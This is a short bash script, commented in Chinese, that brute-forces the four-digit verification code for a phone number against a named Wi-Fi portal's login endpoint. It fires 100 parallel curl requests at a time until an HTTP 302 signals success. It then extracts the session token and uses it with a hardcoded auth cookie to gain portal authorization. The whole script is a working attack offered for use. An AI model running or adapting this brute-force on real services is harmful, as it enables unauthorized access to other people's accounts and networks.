#!/bin/bash
phone= # 此处输入手机号
num=0 # 此处输入起始验证码
thread=100 # 此处多线程
if [[ -n $1 ]]; then
	phone=$1
fi
if [[ -n $2 ]]; then
	num=$2
fi
echo "phone: ${phone}	start_code: ${num}	thread: ${thread}"
while ((num < 10000)) do
	printf "try: %04d ~ %04d\r" ${num} $(($num+$thread))
	for ((i=0;i<thread;i++,num++)) do 
	{
		status_code=$(curl -s -o /dev/null -w "%{http_code}" -d "username=${phone}&password=$(printf '%04d' $num)" "http://lemonwifi.cn:80/portal/login")
		if [ ${status_code} -eq 302 ]; then
			printf "\nFOUND CODE! %04d\n" $num
			lw_token=$(curl -s -d "username=${phone}&password=$(printf '%04d' $num)" "http://lemonwifi.cn:80/portal/login" -D - | grep -Po '(?<=lw-token=)\w+' )
			echo "FOUND lw-token! ${lw_token}"
			curl -X POST --cookie  "lw-token=${lw_token}; lw-auth=981fb1a00c2100000000000000000001; " "http://lemonwifi.cn:80/portal/auth.ajax" | jq 'walk( if (type == "number" and try (. | tostring | length == 13)) then (./1000 | strftime("%Y-%m-%d %H:%M:%S.%ms")) else . end)'
			kill $$
		fi
	}&
	done
	wait
done
printf "\nno found!"

